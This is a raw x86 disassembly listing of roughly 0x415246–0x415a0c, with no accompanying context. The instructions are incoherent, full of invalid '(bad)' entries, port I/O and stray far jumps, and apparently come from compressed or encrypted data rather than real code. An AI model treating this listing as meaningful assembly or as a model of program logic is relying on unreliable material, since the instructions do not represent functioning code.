  415246:	and    eax,0x5bb95080
  41524b:	mov    ds:0xc331ccd9,eax
  415250:	cwde   
  415251:	push   ss
  415252:	sub    DWORD PTR [edi+0x3fadf68f],ebp
  415258:	adc    DWORD PTR [esi],ebx
  41525a:	mov    bh,0xbf
  41525c:	xchg   edi,eax
  41525d:	out    0xeb,al
  41525f:	nop
  415260:	repnz fcom DWORD PTR [esi]
  415263:	in     al,0xb0
  415265:	enter  0xe838,0x7e
  415269:	mov    BYTE PTR [ebx+0x10ab8844],ah
  41526f:	jno    0x41528b
  415271:	jmp    0x4152d0
  415273:	or     cl,BYTE PTR [esi]
  415275:	pop    ebp
  415276:	mov    bl,0x39
  415278:	sbb    al,0xd
  41527a:	hlt    
  41527b:	in     al,0x5e
  41527d:	cmp    eax,edi
  41527f:	jmp    0x923e:0x2f82b045
  415286:	xor    esi,edi
  415288:	xchg   ebp,eax
  415289:	dec    edi
  41528a:	jno    0x4152cf
  41528c:	xor    cl,cl
  41528e:	rol    bl,cl
  415290:	dec    ebx
  415291:	int3   
  415292:	xor    BYTE PTR [eax+0x13],ch
  415295:	sub    BYTE PTR [esi+0x36],0xd5
  415299:	mov    bh,BYTE PTR [esi-0x7ee96c54]
  41529f:	sbb    al,0x81
  4152a1:	xor    ax,WORD PTR [eax]
  4152a4:	stc    
  4152a5:	xlat   BYTE PTR ds:[ebx]
  4152a6:	clc    
  4152a7:	push   ebx
  4152a8:	add    dh,0x3c
  4152ab:	call   FWORD PTR [edx+0x22179ba6]
  4152b1:	mov    ebp,0xbbdc5129
  4152b6:	int    0x4c
  4152b8:	stos   BYTE PTR es:[edi],al
  4152b9:	out    dx,al
  4152ba:	test   DWORD PTR [edx+0x5f],esi
  4152bd:	and    dl,cl
  4152bf:	out    dx,eax
  4152c0:	repnz dec esi
  4152c2:	dec    edi
  4152c3:	cmp    dh,dl
  4152c5:	addr16 jge 0x4152fb
  4152c8:	mov    ecx,?
  4152ca:	add    edi,DWORD PTR [edi+ecx*1]
  4152cd:	dec    ebp
  4152ce:	jp     0x415339
  4152d0:	std    
  4152d1:	bound  ebx,QWORD PTR [ebp-0xd2f70d6]
  4152d7:	(bad)  
  4152d9:	mov    ?,WORD PTR [edi-0x4207e482]
  4152df:	sahf   
  4152e0:	les    esp,FWORD PTR [edx+0x37]
  4152e3:	dec    ebp
  4152e4:	sti    
  4152e5:	ins    BYTE PTR es:[edi],dx
  4152e6:	dec    edi
  4152e7:	push   0x9d294d50
  4152ec:	adc    eax,0x643f80b1
  4152f1:	xchg   esp,eax
  4152f2:	mov    esp,0xfddd8baf
  4152f7:	das    
  4152f8:	xchg   esi,eax
  4152f9:	inc    eax
  4152fa:	xor    eax,edi
  4152fc:	push   ebx
  4152fd:	jns    0x4152f4
  4152ff:	xchg   ebp,eax
  415300:	fadd   DWORD PTR [ecx+ebx*4]
  415303:	fwait
  415304:	nop
  415305:	cmp    BYTE PTR [ebx],bh
  415307:	push   edx
  415308:	ficom  DWORD PTR [eax+esi*4+0x5bd984a9]
  41530f:	in     eax,dx
  415310:	pop    ebp
  415311:	leave  
  415312:	xchg   esp,ebx
  415314:	bound  eax,QWORD PTR ds:0x2441ee54
  41531a:	mov    ebx,esi
  41531c:	gs scas eax,DWORD PTR es:[edi]
  41531e:	out    0x90,eax
  415320:	sbb    eax,0x81d943f
  415325:	pop    ecx
  415326:	push   ebp
  415327:	mov    ebp,0x37d4cb52
  41532c:	mov    dl,0x15
  41532e:	pop    edx
  41532f:	ret    0xdcdd
  415332:	ret    
  415333:	mov    ebx,0x997ee4a9
  415338:	loope  0x41535e
  41533a:	in     eax,dx
  41533b:	gs pusha 
  41533d:	push   es
  41533e:	add    ecx,DWORD PTR [eax+0xe]
  415341:	adc    ebp,edi
  415343:	pop    ebp
  415344:	jne    0x4152dd
  415346:	ret    0x753b
  415349:	jo     0x4152ee
  41534b:	mov    ah,0x5a
  41534d:	scas   al,BYTE PTR es:[edi]
  41534e:	adc    DWORD PTR [edi-0x50],ecx
  415351:	leave  
  415352:	mov    ecx,0x5bd9940e
  415357:	jg     0x415323
  415359:	pop    ds
  41535a:	cdq    
  41535b:	add    DWORD PTR [ebx],ecx
  41535d:	daa    
  41535e:	fdiv   DWORD PTR [eax-0xd]
  415361:	add    cl,bh
  415363:	ret    0x843a
  415366:	adc    ah,ah
  415368:	fst    DWORD PTR [ebx-0x1a]
  41536b:	jo     0x415316
  41536d:	div    ecx
  41536f:	or     al,0x4c
  415371:	xor    ch,BYTE PTR [ebx+ecx*8]
  415374:	inc    ecx
  415375:	fdivrp st(6),st
  415377:	adc    al,0x43
  415379:	int    0x4d
  41537b:	stc    
  41537c:	(bad)  
  41537d:	xor    eax,0xf88be401
  415382:	in     eax,0x6
  415384:	or     DWORD PTR [eax+edx*2],esp
  415387:	ins    DWORD PTR es:[edi],dx
  415388:	lods   al,BYTE PTR ds:[esi]
  415389:	fsubp  st(1),st
  41538b:	or     edx,0xffffff97
  41538e:	pop    ss
  41538f:	rol    dl,0x88
  415392:	xchg   ebp,eax
  415393:	dec    ebx
  415394:	push   ss
  415395:	test   DWORD PTR [ecx],esp
  415397:	xchg   edi,eax
  415398:	rcr    DWORD PTR [edi],cl
  41539a:	(bad)  
  41539b:	adc    al,0xea
  41539d:	outs   dx,BYTE PTR ds:[esi]
  41539e:	inc    edi
  41539f:	mov    ebx,DWORD PTR [edi+0x4f]
  4153a2:	enter  0x3436,0x3c
  4153a6:	test   dh,al
  4153a8:	xchg   esi,eax
  4153a9:	cmp    eax,0xbc46ef4a
  4153ae:	into   
  4153af:	push   ecx
  4153b0:	lahf   
  4153b1:	repnz mov dh,0x23
  4153b4:	arpl   WORD PTR [ecx],bp
  4153b6:	adc    eax,0xa5f40f08
  4153bb:	test   BYTE PTR [ecx+0x1d1f81e1],ch
  4153c1:	loop   0x4153d7
  4153c3:	popa   
  4153c4:	lock pusha 
  4153c6:	std    
  4153c7:	pusha  
  4153c8:	adc    eax,0x1b82fe9e
  4153cd:	enter  0x5b82,0x97
  4153d1:	jecxz  0x41543e
  4153d3:	mov    edx,0xaa3e6d48
  4153d8:	jmp    0x415384
  4153da:	or     BYTE PTR [edx+0x38328bca],ch
  4153e0:	mov    al,ds:0x61958184
  4153e5:	std    
  4153e6:	mov    dh,BYTE PTR [edx-0x5e]
  4153e9:	int    0x13
  4153eb:	xchg   DWORD PTR cs:[esi],eax
  4153ee:	pop    ebx
  4153ef:	js     0x41546b
  4153f1:	std    
  4153f2:	add    al,0x4d
  4153f4:	mov    ds:0xf602dcc7,eax
  4153f9:	sar    DWORD PTR [ebx-0x69],cl
  4153fc:	les    ebp,FWORD PTR [ecx+edi*4+0x57]
  415400:	jno    0x41547d
  415402:	mov    edx,?
  415404:	xchg   esi,eax
  415405:	pop    ds
  415406:	add    edi,DWORD PTR [ecx]
  415408:	sub    edi,DWORD PTR [edi-0x7d27d32d]
  41540e:	(bad)  
  41540f:	and    al,0xf1
  415411:	(bad)  
  415412:	fsub   DWORD PTR [edx]
  415414:	std    
  415415:	outs   dx,BYTE PTR ds:[esi]
  415416:	xor    DWORD PTR [eax],ebp
  415418:	sbb    DWORD PTR [edi+esi*2+0x75212044],edi
  41541f:	push   esp
  415420:	fucom  st(4)
  415422:	in     al,dx
  415423:	in     al,0xb6
  415425:	push   0x13
  415427:	les    ebp,FWORD PTR [edi+esi*1]
  41542a:	or     eax,0x8ec40a4b
  41542f:	push   ecx
  415430:	xchg   ecx,eax
  415431:	push   ebx
  415432:	jnp    0x415487
  415434:	stos   BYTE PTR es:[edi],al
  415435:	leave  
  415436:	dec    esp
  415437:	push   0x14
  415439:	xor    eax,0x1d45593c
  41543e:	xchg   ax,ax
  415440:	nop
  415441:	dec    eax
  415442:	arpl   WORD PTR [edi+0x3becf727],ax
  415448:	mov    WORD PTR [ecx+0x36],ds
  41544b:	add    ebx,edi
  41544d:	push   edi
  41544e:	add    al,BYTE PTR [ecx+0xb9e7819]
  415454:	shr    BYTE PTR [edx],cl
  415456:	pop    esi
  415457:	(bad)  
  415458:	repz aaa 
  41545a:	sbb    DWORD PTR [ebx+0x54578479],ebp
  415460:	jb     0x415498
  415462:	(bad)  
  415464:	sub    bh,0x27
  415467:	and    dh,BYTE PTR [ecx+0x7b]
  41546a:	ror    BYTE PTR [esi-0x38b13f11],0xc2
  415471:	shl    BYTE PTR ss:[ebp+0x6e],cl
  415475:	pop    ebp
  415476:	xor    esp,DWORD PTR [ecx-0x26ea4e4a]
  41547c:	jge    0x415443
  41547e:	pop    esi
  41547f:	sub    eax,0x420127a2
  415484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415485:	scas   al,BYTE PTR es:[edi]
  415486:	in     al,dx
  415487:	and    eax,0x1de7abb6
  41548c:	xchg   BYTE PTR [edx+0x50],dh
  41548f:	pusha  
  415490:	mov    al,0xac
  415492:	mov    al,0x88
  415494:	and    ah,BYTE PTR [eax+0x7c]
  415497:	aam    0x48
  415499:	sti    
  41549a:	jle    0x4154a9
  41549c:	fadd   DWORD PTR ds:0xce142e13
  4154a2:	cli    
  4154a3:	fdiv   st,st(1)
  4154a5:	add    DWORD PTR [edi],ebx
  4154a7:	mov    ah,0xbf
  4154a9:	fcomp  DWORD PTR [eax+0x3c602f0a]
  4154b0:	ja     0x4154ed
  4154b2:	repnz fs stc 
  4154b5:	adc    edi,esi
  4154b7:	ret    0xbec9
  4154ba:	nop
  4154bb:	mov    esi,0xabfbba67
  4154c0:	mov    BYTE PTR [esi-0x11],dh
  4154c3:	jbe    0x415525
  4154c5:	(bad)  
  4154c8:	mov    eax,0xf1d45d98
  4154cd:	fwait
  4154ce:	xchg   edx,eax
  4154cf:	in     eax,0x57
  4154d1:	arpl   WORD PTR [eax+0x25ec84c6],di
  4154d7:	or     eax,0x12e864da
  4154dc:	fisubr DWORD PTR [ebx-0x50]
  4154df:	xor    BYTE PTR [ecx-0x26c0e628],dh
  4154e5:	sub    al,0x34
  4154e7:	(bad)  
  4154e8:	leave  
  4154e9:	xchg   esi,eax
  4154ea:	fwait
  4154eb:	pop    ss
  4154ec:	inc    ebp
  4154ed:	push   eax
  4154ee:	bound  eax,QWORD PTR [edx]
  4154f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154f1:	sub    cl,dh
  4154f3:	xchg   esp,eax
  4154f4:	and    BYTE PTR [eax+0x1b6d2a6b],0x88
  4154fb:	in     eax,dx
  4154fc:	retf   
  4154fd:	sbb    ecx,DWORD PTR [edi]
  4154ff:	outs   dx,BYTE PTR ds:[esi]
  415500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415501:	pop    esi
  415502:	mov    ds:0x9548aff1,eax
  415507:	mov    bh,0xe2
  415509:	fistp  WORD PTR [esi]
  41550b:	mov    ebx,0x7727c4dc
  415510:	int    0xf9
  415512:	push   cs
  415513:	lds    eax,FWORD PTR [ebx]
  415515:	pop    esi
  415516:	xlat   BYTE PTR ds:[ebx]
  415517:	jle    0x415547
  415519:	and    al,0x39
  41551b:	push   eax
  41551c:	mov    esi,0x35af4a1b
  415521:	aas    
  415522:	es jmp 0x4154b9
  415525:	lea    ebx,[ecx+0x37]
  415528:	cld    
  415529:	mov    eax,ds:0xcbdf03de
  41552e:	xor    al,0x6d
  415530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415531:	mov    eax,0x98c26f2f
  415536:	adc    BYTE PTR [edx],ch
  415538:	fisttp WORD PTR ds:[edx+0x7aeddd33]
  41553f:	inc    edx
  415540:	lea    eax,[edx]
  415542:	and    BYTE PTR [esi+0x78],bh
  415545:	or     dh,BYTE PTR [esi]
  415547:	lods   eax,DWORD PTR ds:[esi]
  415548:	adc    esp,DWORD PTR [eax+0x3cd9ab73]
  41554e:	repnz in al,0x44
  415551:	repz push edx
  415553:	mov    dl,0xfe
  415555:	jno    0x41556b
  415557:	dec    eax
  415558:	sub    DWORD PTR [esi+0x6b3f18bc],eax
  41555e:	hlt    
  41555f:	adc    eax,0x2f892735
  415564:	aad    0x11
  415566:	add    bl,BYTE PTR [eax-0x720655c5]
  41556c:	add    esp,DWORD PTR [edi]
  41556e:	xchg   edi,eax
  41556f:	cld    
  415570:	jo     0x4155ab
  415572:	inc    esi
  415573:	mov    eax,DWORD PTR [edi-0x28]
  415576:	lods   eax,DWORD PTR ds:[esi]
  415577:	or     DWORD PTR [edx+0x669a5533],ebp
  41557d:	fs jle 0x415501
  415580:	xchg   esp,eax
  415581:	hlt    
  415582:	in     eax,dx
  415583:	aaa    
  415584:	xor    DWORD PTR [edx+0x76239848],0x2c496342
  41558e:	(bad)  
  41558f:	std    
  415590:	shl    dl,1
  415592:	je     0x415602
  415594:	cmp    bh,BYTE PTR [ebp-0x60]
  415597:	cmp    BYTE PTR [edx+0x614d3152],cl
  41559d:	pop    esi
  41559e:	xlat   BYTE PTR ds:[ebx]
  41559f:	adc    ecx,DWORD PTR [ecx-0x1529bdd2]
  4155a5:	aad    0xe0
  4155a7:	inc    eax
  4155a8:	stos   BYTE PTR es:[edi],al
  4155a9:	int    0x76
  4155ab:	cli    
  4155ac:	mov    esi,0xe7f8db82
  4155b1:	(bad)  
  4155b2:	lods   al,BYTE PTR ds:[esi]
  4155b3:	xlat   BYTE PTR ds:[ebx]
  4155b4:	jno    0x41555c
  4155b6:	cmp    DWORD PTR [edi],esi
  4155b8:	jg     0x4155ed
  4155ba:	sub    eax,0xe286c75d
  4155bf:	in     eax,0xbf
  4155c1:	pop    esi
  4155c2:	nop
  4155c3:	neg    DWORD PTR [ebx+0x19df3276]
  4155c9:	or     al,0x69
  4155cb:	jno    0x41555c
  4155cd:	add    eax,0x37afb8d3
  4155d2:	cdq    
  4155d3:	cmp    DWORD PTR [ebp-0x71],esp
  4155d6:	in     al,0xf3
  4155d8:	(bad)  
  4155d9:	pusha  
  4155da:	call   0x54993f40
  4155df:	clc    
  4155e0:	adc    DWORD PTR [eax+0x7337e9ee],edi
  4155e6:	sbb    al,0x65
  4155e8:	shl    dh,0x13
  4155eb:	je     0x415597
  4155ed:	in     eax,0x28
  4155ef:	and    BYTE PTR [eax],cl
  4155f1:	adc    DWORD PTR [esi],0x37
  4155f4:	(bad)  
  4155f6:	add    eax,DWORD PTR [eax]
  4155f8:	scas   al,BYTE PTR es:[edi]
  4155f9:	adc    eax,0xdf9c1595
  4155fe:	data16 jb 0x41563a
  415601:	clc    
  415602:	jno    0x415627
  415604:	ins    DWORD PTR es:[edi],dx
  415605:	sub    al,0x92
  415607:	fcom   QWORD PTR [edx]
  415609:	retf   
  41560a:	push   ds
  41560b:	pop    ss
  41560c:	leave  
  41560d:	xchg   ebx,eax
  41560e:	jp     0x4155ff
  415610:	aad    0xf1
  415612:	pushf  
  415613:	pop    ds
  415614:	or     ch,BYTE PTR [ecx]
  415616:	inc    ebp
  415617:	pop    ecx
  415618:	imul   esp,DWORD PTR [esi-0x352aa4b0],0x3b8b2c13
  415622:	fs jae 0x4155fd
  415625:	stos   BYTE PTR es:[edi],al
  415626:	mov    DWORD PTR [ebx],esp
  415628:	jno    0x4155c4
  41562a:	sar    BYTE PTR [edx],0x3a
  41562d:	loopne 0x4155c7
  41562f:	or     esi,DWORD PTR [edi]
  415631:	(bad)  
  415632:	mov    al,ds:0x83454c3a
  415637:	out    0xf4,al
  415639:	xchg   edi,eax
  41563a:	or     al,0xa0
  41563c:	xor    BYTE PTR [ebp-0x2567474c],ah
  415642:	push   ecx
  415643:	cmp    DWORD PTR [eax-0x2b2951ff],ebx
  415649:	fstp   DWORD PTR ds:0x72b4ae13
  41564f:	retf   0xb92d
  415652:	pop    esi
  415653:	add    ch,dh
  415655:	(bad)  
  415657:	xor    edi,ecx
  415659:	rcr    BYTE PTR ds:0xf6a045b7,cl
  41565f:	ret    
  415660:	mov    dl,0xd4
  415662:	dec    ebp
  415663:	pop    es
  415664:	(bad)  
  415666:	sub    eax,0x19412fea
  41566b:	lock jbe 0x415641
  41566e:	mov    ebx,0xa6067c22
  415673:	jp     0x4156cc
  415675:	cdq    
  415676:	mov    eax,0x79c5e2d8
  41567b:	stos   DWORD PTR es:[edi],eax
  41567c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41567d:	sbb    DWORD PTR [ebx-0x69],0xffffffac
  415681:	test   eax,0x8f5e83aa
  415686:	test   eax,0x7048a271
  41568b:	cmp    dl,BYTE PTR [eax-0x67]
  41568e:	xchg   ecx,eax
  415690:	and    ebp,DWORD PTR [esi+0x1e983328]
  415696:	mov    al,0x8c
  415698:	push   edx
  415699:	jnp    0x4156aa
  41569b:	loop   0x41569a
  41569d:	pushf  
  41569e:	outs   dx,BYTE PTR ds:[esi]
  41569f:	mov    al,0xd0
  4156a1:	push   ebx
  4156a2:	jo     0x41571b
  4156a4:	cmp    BYTE PTR ds:0xf7eb7d9,dl
  4156aa:	pminsw mm5,mm2
  4156ad:	retf   0x100d
  4156b0:	push   ds
  4156b1:	lds    esi,FWORD PTR [ebx+0x4c4d6aab]
  4156b7:	push   0x9536733e
  4156bc:	sbb    esp,esp
  4156be:	push   cs
  4156bf:	cmp    DWORD PTR [ebp+0x38],0xdaa80353
  4156c6:	loop   0x41572e
  4156c8:	jmp    0x557d:0xe89ca094
  4156cf:	mov    ebx,0x27ad867e
  4156d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156d5:	inc    ecx
  4156d6:	mov    dh,0x32
  4156d8:	xor    esp,0x49dc3253
  4156de:	(bad)  
  4156df:	pop    eax
  4156e0:	inc    ebx
  4156e1:	or     esp,DWORD PTR [eax]
  4156e3:	cmp    eax,0xc60be7b7
  4156e8:	push   edi
  4156e9:	jmp    0x4156eb
  4156eb:	pushf  
  4156ec:	imul   ebx,DWORD PTR [edx+0x69],0xffffffab
  4156f0:	rcr    BYTE PTR [edi+0x2c],cl
  4156f3:	inc    ebx
  4156f4:	fild   WORD PTR [ecx-0x65]
  4156f7:	out    dx,eax
  4156f8:	popa   
  4156f9:	fsubr  DWORD PTR [ecx]
  4156fb:	aam    0x72
  4156fd:	fwait
  4156fe:	sub    eax,0x45694c0e
  415703:	push   esp
  415704:	enter  0x1b96,0x15
  415708:	stc    
  415709:	xchg   edi,eax
  41570a:	adc    cl,BYTE PTR [eax+0x419b195b]
  415710:	stos   BYTE PTR es:[edi],al
  415711:	les    eax,FWORD PTR [edx]
  415713:	xchg   ecx,eax
  415714:	pop    es
  415715:	add    cl,BYTE PTR [ecx+0x4e218dba]
  41571b:	push   esp
  41571c:	jecxz  0x41573f
  41571e:	push   ds
  41571f:	push   ecx
  415720:	dec    esp
  415721:	pop    esp
  415722:	adc    esi,eax
  415724:	adc    dh,ah
  415726:	dec    ebx
  415727:	sub    eax,0xc832fdd3
  41572c:	daa    
  41572d:	push   edi
  41572e:	aas    
  41572f:	int    0x8a
  415731:	repnz xor dl,cl
  415734:	push   edi
  415735:	adc    eax,0xf3573453
  41573a:	jns    0x4156ee
  41573c:	xor    DWORD PTR [ebx+0x2a732de7],eax
  415742:	dec    ecx
  415743:	shr    ch,0xbb
  415746:	dec    ebx
  415747:	push   ss
  415748:	jecxz  0x4157c5
  41574a:	sbb    dl,dl
  41574c:	xchg   edx,eax
  41574d:	and    ch,BYTE PTR ds:0x723e4bad
  415753:	mov    dl,0x79
  415755:	mov    eax,0x2b0f59ee
  41575a:	add    DWORD PTR [esi+0x58],eax
  41575d:	dec    eax
  41575e:	aas    
  41575f:	and    BYTE PTR [edx],bl
  415761:	ins    BYTE PTR es:[edi],dx
  415762:	lods   al,BYTE PTR ds:[esi]
  415763:	jo     0x415797
  415765:	xor    edx,ebx
  415767:	xor    eax,0x592c3f54
  41576c:	sbb    dl,al
  41576e:	push   esi
  41576f:	jle    0x41570e
  415771:	in     eax,0x89
  415773:	push   edx
  415774:	clc    
  415775:	and    ebp,DWORD PTR [esi-0x1c]
  415778:	and    al,ah
  41577a:	or     DWORD PTR [esi-0x5c],ebp
  41577d:	ds in  eax,dx
  41577f:	(bad)  
  415780:	outs   dx,BYTE PTR ds:[esi]
  415781:	mov    esi,0x76ef8dbc
  415786:	ret    0x8818
  415789:	aam    0xbe
  41578b:	jb     0x4157f6
  41578d:	in     eax,dx
  41578e:	dec    ecx
  41578f:	fistp  QWORD PTR [eiz*4+0x3c93a215]
  415796:	mov    eax,0x10e846f
  41579b:	push   ecx
  41579c:	into   
  41579d:	push   cs
  41579e:	test   edx,esp
  4157a0:	or     bh,BYTE PTR [ecx]
  4157a2:	cmp    edx,DWORD PTR [edx-0x467f74be]
  4157a8:	push   edx
  4157a9:	sub    edi,edx
  4157ab:	in     al,dx
  4157ac:	sbb    DWORD PTR [ecx+esi*1+0x3d742eb8],edx
  4157b3:	das    
  4157b4:	sbb    eax,DWORD PTR [ebx]
  4157b6:	push   ecx
  4157b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157b8:	add    eax,0x4b32ce2f
  4157bd:	shl    esi,1
  4157bf:	pop    eax
  4157c0:	mov    ss,eax
  4157c2:	push   ebp
  4157c3:	pop    esi
  4157c4:	push   ebp
  4157c5:	and    DWORD PTR [esi+eax*1-0x7fbbf37b],ebx
  4157cc:	push   ss
  4157cd:	pop    ebx
  4157ce:	dec    ebx
  4157cf:	adc    al,BYTE PTR [edi+0x160a3e12]
  4157d5:	daa    
  4157d6:	pop    esi
  4157d7:	sahf   
  4157d8:	dec    eax
  4157d9:	(bad)  [ebp-0x5a]
  4157dc:	stc    
  4157dd:	mov    eax,ds:0x27ef5e54
  4157e2:	sub    al,0xab
  4157e4:	sbb    ecx,DWORD PTR [edx*2-0x2adfd32a]
  4157eb:	push   edx
  4157ec:	or     ecx,DWORD PTR [edi-0x5cbbe9b2]
  4157f2:	(bad)  
  4157f3:	xor    BYTE PTR [edx],ah
  4157f5:	sub    BYTE PTR [edx-0x21],cl
  4157f8:	sub    al,0x74
  4157fa:	out    0x1b,al
  4157fc:	pop    ss
  4157fd:	mov    WORD PTR [edx+0x69],?
  415800:	nop
  415801:	sub    eax,0x3b79a3b3
  415806:	outs   dx,DWORD PTR ds:[esi]
  415807:	pop    edi
  415808:	loopne 0x41579a
  41580a:	shl    DWORD PTR [eax],0xd6
  41580d:	xchg   ebx,eax
  41580e:	xchg   edx,eax
  41580f:	xor    al,ah
  415811:	es ret 0x1565
  415815:	ds pop es
  415817:	loop   0x41588c
  415819:	dec    esi
  41581a:	test   eax,0x9679677a
  41581f:	xor    dh,BYTE PTR [ecx]
  415821:	and    ch,ah
  415823:	and    BYTE PTR [ebp-0x9],dl
  415826:	mul    DWORD PTR [ebp-0x72]
  415829:	enter  0x76da,0xe5
  41582d:	mov    esp,DWORD PTR [ebp-0x6cceaf9f]
  415833:	fbld   TBYTE PTR [esi+0x795fdb83]
  415839:	int3   
  41583a:	xchg   edi,eax
  41583b:	jecxz  0x415880
  41583d:	sar    DWORD PTR [ecx],0xdd
  415840:	ror    DWORD PTR [edi-0x3b],1
  415843:	(bad)  
  415844:	lock daa 
  415846:	retf   
  415847:	retw   
  415849:	frstor [esi]
  41584b:	add    edx,ebp
  41584d:	jge    0x4158c2
  41584f:	xchg   DWORD PTR [eax-0x5d],ecx
  415852:	arpl   WORD PTR [ebx+0x177726e8],cx
  415858:	popf   
  415859:	xchg   esi,eax
  41585a:	xchg   DWORD PTR [ebp+0x5202713f],edx
  415860:	out    0x97,eax
  415862:	dec    esi
  415863:	push   esi
  415864:	lock and eax,DWORD PTR [ecx-0x296b3e1a]
  41586b:	in     eax,0x45
  41586d:	cmp    ecx,DWORD PTR [ebp-0xc]
  415870:	push   es
  415871:	pushf  
  415872:	in     al,dx
  415873:	adc    BYTE PTR [eax+0x4e],ch
  415876:	jl     0x4158de
  415878:	mov    ebp,0x2768a97
  41587d:	call   0x279b:0x596b434d
  415884:	xlat   BYTE PTR ds:[ebx]
  415885:	(bad)  
  415886:	in     eax,0xfc
  415888:	in     al,0x60
  41588a:	mov    edi,0x549029a8
  41588f:	jne    0x4158c2
  415891:	pop    edi
  415892:	dec    edi
  415893:	push   ecx
  415894:	mov    BYTE PTR [ebp+0x45],0xd7
  415898:	adc    BYTE PTR [ebp+0x4a12c1c7],0xe0
  41589f:	mov    ecx,0x5ebda236
  4158a4:	xor    bl,BYTE PTR [ebx-0x269fd94f]
  4158aa:	ret    
  4158ab:	outs   dx,BYTE PTR ds:[esi]
  4158ac:	ds aad 0xe1
  4158af:	outs   dx,BYTE PTR ds:[esi]
  4158b0:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4158b2:	add    al,0x7f
  4158b4:	pop    ebx
  4158b5:	add    ah,BYTE PTR [edi+edx*2]
  4158b8:	mov    DWORD PTR [edi],ecx
  4158ba:	out    dx,eax
  4158bb:	in     eax,0x9a
  4158bd:	ja     0x41588c
  4158bf:	aam    0xcc
  4158c1:	fwait
  4158c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158c3:	mov    ebp,0xe6471dfc
  4158c8:	icebp  
  4158c9:	test   DWORD PTR [edx],edx
  4158cb:	scas   al,BYTE PTR es:[edi]
  4158cc:	sub    bh,BYTE PTR [eax-0x7d370c69]
  4158d2:	in     eax,dx
  4158d3:	loope  0x415886
  4158d5:	sub    dl,BYTE PTR [ebx-0x1b04065e]
  4158db:	cmp    bh,BYTE PTR [eax-0x1f]
  4158de:	pop    esp
  4158df:	mov    eax,0x4e081590
  4158e4:	inc    eax
  4158e5:	jae    0x4158db
  4158e7:	inc    edx
  4158e8:	pop    edx
  4158e9:	iret   
  4158ea:	fwait
  4158eb:	sahf   
  4158ec:	loope  0x415925
  4158ee:	sahf   
  4158ef:	sbb    bl,dl
  4158f1:	dec    edx
  4158f2:	pop    ebp
  4158f3:	repz das 
  4158f5:	popf   
  4158f6:	jle    0x4158b4
  4158f8:	mov    WORD PTR [edx-0x4a8a756],es
  4158fe:	cwde   
  4158ff:	call   0x9381:0x37c6a1e5
  415906:	mov    al,0x18
  415908:	mov    eax,ds:0xf3d396d1
  41590d:	int    0xc6
  41590f:	jmp    0x5d840066
  415914:	mov    WORD PTR [ecx],ds
  415916:	fisttp QWORD PTR [edi+0x31]
  415919:	pop    es
  41591a:	(bad)  
  41591b:	in     eax,dx
  41591c:	or     bl,BYTE PTR [ebx]
  41591e:	sub    DWORD PTR [edi],ebp
  415920:	lods   al,BYTE PTR ds:[esi]
  415921:	in     eax,dx
  415922:	fild   QWORD PTR ds:0xb83475e8
  415928:	int    0x66
  41592a:	push   0x43e5dff6
  41592f:	retf   0x7d1d
  415932:	mov    edi,0x41dc2490
  415937:	mov    esp,0x6beefa3e
  41593c:	jge    0x4158c3
  41593e:	mov    dh,0xb9
  415940:	outs   dx,BYTE PTR ds:[esi]
  415941:	dec    edi
  415942:	adc    dh,BYTE PTR [ebp-0x14454b0e]
  415948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415949:	mov    WORD PTR [ecx+0x52],ds
  41594c:	fisubr WORD PTR [ebx+0x44fa7506]
  415952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415953:	adc    eax,0xbca411c5
  415958:	leavew 
  41595a:	xchg   BYTE PTR [esi-0x25],dl
  41595d:	sbb    ah,BYTE PTR [edi*1+0x2f33525e]
  415964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415965:	dec    ecx
  415966:	dec    esi
  415967:	mov    esp,0x61aad416
  41596c:	push   ecx
  41596d:	adc    edi,eax
  41596f:	or     al,0x66
  415971:	mul    DWORD PTR [edi]
  415973:	popa   
  415974:	xor    eax,0x8124b604
  415979:	loopne 0x415956
  41597b:	(bad)  
  41597c:	in     al,dx
  41597d:	sbb    ebp,esp
  41597f:	loopne 0x41599d
  415981:	dec    ebp
  415982:	mov    bl,0x74
  415984:	dec    ebx
  415985:	jns    0x41595d
  415987:	test   DWORD PTR [edi],0x3595a4f2
  41598d:	lahf   
  41598e:	add    eax,0xf34233a
  415993:	mov    dl,BYTE PTR [ebx]
  415995:	sub    eax,DWORD PTR [edx]
  415997:	push   ecx
  415998:	jg     0x4159eb
  41599a:	xor    ah,dl
  41599c:	mov    DWORD PTR [eax],ecx
  41599e:	(bad)  
  41599f:	pop    ds
  4159a0:	mov    eax,0x24a5595f
  4159a5:	cmp    al,BYTE PTR [edx-0x13]
  4159a8:	scas   eax,DWORD PTR es:[edi]
  4159a9:	repz cmp BYTE PTR [esi-0x75698735],dl
  4159b0:	retf   0xe4e0
  4159b3:	push   esi
  4159b4:	pop    es
  4159b5:	cmp    BYTE PTR [edx-0x29],ah
  4159b8:	xor    esi,eax
  4159ba:	test   BYTE PTR [edx+0x52],dh
  4159bd:	xor    BYTE PTR [edx+0x33727a2b],0x6c
  4159c4:	mov    ebp,0x2f37050f
  4159c9:	add    eax,0x491ec137
  4159ce:	push   es
  4159cf:	dec    edx
  4159d0:	and    BYTE PTR [edx],ch
  4159d2:	mov    bh,0x54
  4159d4:	test   DWORD PTR [ecx+0x4c3e6c8a],esi
  4159da:	test   DWORD PTR [ecx-0x2ea5ba75],esi
  4159e0:	in     eax,dx
  4159e1:	fidiv  WORD PTR [eax+ebx*2+0x1e717b7e]
  4159e8:	jmp    0x843c:0x67268819
  4159ef:	and    ecx,edi
  4159f1:	js     0x415998
  4159f3:	lods   eax,DWORD PTR ds:[esi]
  4159f4:	idiv   BYTE PTR [esi]
  4159f6:	or     eax,0x36c6f7d8
  4159fb:	sbb    cl,0x8
  4159fe:	mov    ah,0x50
  415a00:	ss lock cld 
  415a03:	ins    BYTE PTR es:[edi],dx
  415a04:	lock adc al,0xac
  415a07:	xor    edi,edi
  415a09:	in     eax,0x2d
  415a0b:	inc    esi
  415a0c:	pop    esp
